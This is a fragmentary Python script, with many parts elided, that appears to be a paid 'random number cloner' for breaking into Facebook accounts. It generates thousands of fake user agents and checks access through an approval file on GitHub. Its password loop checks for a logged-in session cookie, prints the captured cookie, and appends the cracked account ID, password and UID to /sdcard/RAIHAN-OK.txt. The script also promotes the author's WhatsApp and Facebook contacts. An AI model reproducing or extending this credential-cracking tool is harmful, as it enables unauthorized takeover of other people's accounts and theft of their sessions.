#RL(MD ABU RAIHAN)(Miss Lamia Akter)
#WhatsApp : 01314437492
#Github : Falto4437
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
from concurrent.futures import ThreadPoolExecutor as ahmadAXI#RL(MD ABU RAIHAN)(Miss Lamia Akter)
#WhatsApp : 01314437492
#Github : Falto4437
#!/usr/bin/python3
#-*-coding:utf-8-*-
...
for xd in range(3005):
    ...
    uas.append(ff)
for RAIHAN in range(9993,176281):
...
def menu_apikey():
  ...
  print("""\x1b[1;97m
    ...
    │ [✓] GITHUB   : Falto.4427                │
    │ [✓] WHATSAPP : +8801314437492       │
    │ [✓] VERSION  : 1.7.9                   │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m Admin By MD ABU RAIHAN \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of MD ABU RAIHAN \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +8801314437492\033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/profile.php?id=100003472256152&mibextid=ZbWKwL')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/hmaburaihan/RANDOM-CLONER-2023/blob/main/Apruved.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801314437492?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801314437492');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100003472256152&mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RAIHAN-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
